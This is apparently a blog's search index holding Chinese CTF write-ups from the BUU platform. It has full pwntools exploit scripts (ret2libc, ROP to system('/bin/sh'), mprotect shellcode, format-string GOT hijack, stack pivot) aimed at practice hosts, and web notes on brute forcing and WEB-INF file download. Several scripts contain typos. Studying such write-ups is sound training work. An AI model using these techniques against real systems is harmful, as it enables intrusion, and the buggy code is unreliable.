<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUU-[HDCTF 2023]KEEP ON的Wp</title>
    <url>/CTF/Pwn/hdctf%E7%9A%84wp/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-[HNCTF 2022 Week1]fmtstrre的Wp</title>
    <url>/CTF/Pwn/%5BHNCTF%202022%20Week1%5Dfmtstrre/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU平台的做题记录</title>
    <url>/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>-&gt;32位 ret2libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure>





<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>checksec一下：</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png"></p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png"></p>
<p><strong>可知将var[13]赋值一个17(0x11)就可以得到shell</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是这个payload并没有打通。</p>
<p><strong>这里有个知识点:</strong></p>
<blockquote>
<p>qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>学习：32位和64位传参的区别</p>
<p><strong>32位：</strong>直接将参数放在栈中</p>
<p><strong>64位：</strong>前六个参数放在寄存器中（rdi rsi rdx rcx r8 r9），如果还有参数，那再依次放入栈中</p>
<p><strong>题解：</strong></p>
<p>这个题是64位程序，在ida中打开，发现有栈溢出漏洞（vulnerable_function函数中）</p>
<p><code>Shift + F12</code> 可以看到有<code>system</code>函数和 <code>/bin/sh</code>字符串</p>
<p>-&gt; 先覆盖buf和rbp</p>
<p>-&gt; 然后是 pop rdi ret &#x3D;&gt; 将栈顶元素（binsh字符串的地址）弹入rdi寄存器中，并且返回到下一指令处</p>
<p>-&gt; 然后是返回到system()的地址</p>
<p>-&gt; 参数就是rdi寄存器中的 binsh字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span><span class="number">26999</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>rdi的地址这样找：</p>
<p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code></p>
</blockquote>
<h2 id="not-the-same-3dsctf-2016-静态-32位"><a href="#not-the-same-3dsctf-2016-静态-32位" class="headerlink" title="not_the_same_3dsctf_2016[静态 32位]"></a>not_the_same_3dsctf_2016[静态 32位]</h2><p><code>ctrl + x</code> 查看调用字符串的位置</p>
<p><code>ctrl + s</code>调出程序的段表，</p>
<p><code>mprotect(void *addr, size_t len, int prot)函数</code></p>
<p>-&gt; addr 内存启始地址；len 修改内存的长度；prot 内存的权限</p>
<p>-&gt; 将.got.plt段改写为可读可写可执行的</p>
<p><strong>肯定有人疑问了为什么是0x80EB000而不是bss段的开头0x80EBF80，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25763</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>checksec一下 32位 有NX保护（栈不可执行），canary保护（会放入一个值，在返回的时候会进行检查，得保证这个值没变）</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png"></p>
<p>偏移量的计算 10 &#x3D;&gt; 我们输入的数据是从第十个开始的</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/03.png"></p>
<p>A的ascii值是65 &#x3D;&gt; 对应十六进制的0x41             a的ascii值是97 &#x3D;&gt; 对应十六进制的0x61</p>
<p>程序要求我们输入的值与随机数相等，才可以执行<code>system(&#39;bin/sh&#39;)</code></p>
<p>&#x3D;&gt; 由于存在格式化字符串漏洞</p>
<p>我们可以通过<code>%n</code> 来修改储存随机数的地址的值</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/04.png"></p>
<p>随机数起始地址是在 0x804c044 由于随机数是四位 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + p32(<span class="number">0x804c045</span>) + p32(<span class="number">0x804c046</span>) + p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload += <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<p>给Bss赋值，使得NX不可执行变为可执行 &#x3D;&gt; 构建shellcode</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">int mprotect(const void <span class="emphasis">*start, size_t len, int prot);</span></span><br><span class="line"><span class="emphasis">	第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="emphasis">	第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="emphasis">	第三个参数的是要赋予的权限。</span></span><br><span class="line"><span class="emphasis">mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span></span><br><span class="line"><span class="emphasis">prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span></span><br><span class="line"><span class="emphasis">　　1）PROT_READ：表示内存段内的内容可写；</span></span><br><span class="line"><span class="emphasis">　　2）PROT_WRITE：表示内存段内的内容可读；</span></span><br><span class="line"><span class="emphasis">　　3）PROT_EXEC：表示内存段中的内容可执行；</span></span><br><span class="line"><span class="emphasis">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span></span><br><span class="line"><span class="emphasis">prot=7表示可读可写可执行，将它类比于chmod中的7</span></span><br></pre></td></tr></table></figure>



<h3 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h3><p><strong>知识点：格式化字符串劫持、<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移</a></strong></p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/10.png"></p>
<p><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>寻找偏移量 找 616161在第几位 </p>
<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
</blockquote>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/11.png"></p>
<p><strong>法2,栈迁移,可以先阅读前面的那个文章</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>Q&amp;A（个人理解）</p>
<p><code>%16$p是哪来的</code></p>
<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/12.png"></p>
<p><code>0x60是哪里来的?</code></p>
<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/13.png"></p>
<p><code>payload中为什么要加0x20 ?</code></p>
<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/14.png"></p>
<h3 id="BUU-HNCTF-2022-Week1-fmtstrre"><a href="#BUU-HNCTF-2022-Week1-fmtstrre" class="headerlink" title="BUU-[HNCTF 2022 Week1]fmtstrre"></a>BUU-[HNCTF 2022 Week1]fmtstrre</h3><p>先checksec一下</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/06.png"></p>
<p>然后IDA(64)打开</p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png"></p>
<blockquote>
<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
<p>将name的地址赋值给v5</p>
<p>再向buf中写入256字节数据</p>
</blockquote>
<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
<p><code>这段代码中需要打开flag这个文件 =l&gt; 小技巧</code></p>
<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
<p>-&gt;当然,这个文件不是必须的.</p>
<p><code>该如何利用这个漏洞？</code>根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
<p><strong>参考<a href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png"></p>
<blockquote>
<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
</blockquote>
<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png"></p>
<blockquote>
<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
</blockquote>
<p>32 + 6 &#x3D;38</p>
<p><strong>exp:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
    <url>/CTF/Web/BUU-Easy_Java/</url>
    <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
<blockquote>
<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件<br>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
</blockquote>
<p><strong>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">	//servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问class文件目录（详见上面的目录结构），且文件后缀为.class</span><br></pre></td></tr></table></figure>



<h3 id="解题"><a href="#解题" class="headerlink" title="解题:"></a>解题:</h3><p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
<p>弱口令，在Bp的Intruder模块下破解密码</p>
<p><img src="/CTF/Web/BUU-Easy_Java/01.png"></p>
<p>进入之后发现并没有flag -&gt; 注意到login页面下面的help可以点,里面有</p>
<p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
<blockquote>
<p><code>java.io.FileNotFoundException</code> 表示在 Java 中尝试打开或读取文件时，未找到指定路径的文件。在你提供的例子中，文件路径是 <code>&#123;help.docx&#125;</code>。</p>
</blockquote>
<p>此时可以注意到url中是有这个filename参数的，且前面是Download -&gt; 下面对应的文件呗?</p>
<p>但是并没有跳转下载链接, -&gt; 看别人的Wp说，将get方法改为post方法就能跳转下载链接了（不知道为什么）</p>
<p><img src="/CTF/Web/BUU-Easy_Java/03.png"></p>
<p>下载打开help.docx中并没有flag</p>
<p><strong>结合题目信息 Java 以及上面的知识点</strong>  访问下载WEB-INF&#x2F;web.xml -&gt; </p>
<p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
<p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
<p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-[BJDCTF2020]EasySearch的Wp</title>
    <url>/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/</url>
    <content><![CDATA[<h4 id="知识点（参考别人的文章）："><a href="#知识点（参考别人的文章）：" class="headerlink" title="知识点（参考别人的文章）："></a>知识点（参考别人的文章）：</h4><ul>
<li><input disabled type="checkbox"> 1.<a href="https://blog.csdn.net/qq_46145027/article/details/122174063">目录扫描</a></li>
<li><input disabled type="checkbox"> 2.代码审计</li>
<li><input disabled type="checkbox"> 3.<a href="https://blog.csdn.net/cnds123/article/details/125962911">shtml</a></li>
</ul>
<h4 id="1-目录扫描"><a href="#1-目录扫描" class="headerlink" title="1.目录扫描"></a>1.目录扫描</h4><p><code>python dirsearch.py -u &quot;URL&quot; -W ./db/字典名字</code></p>
<h4 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h4><p><code>header(&quot;Content-Type: text/html;charset=utf-8&quot;);</code></p>
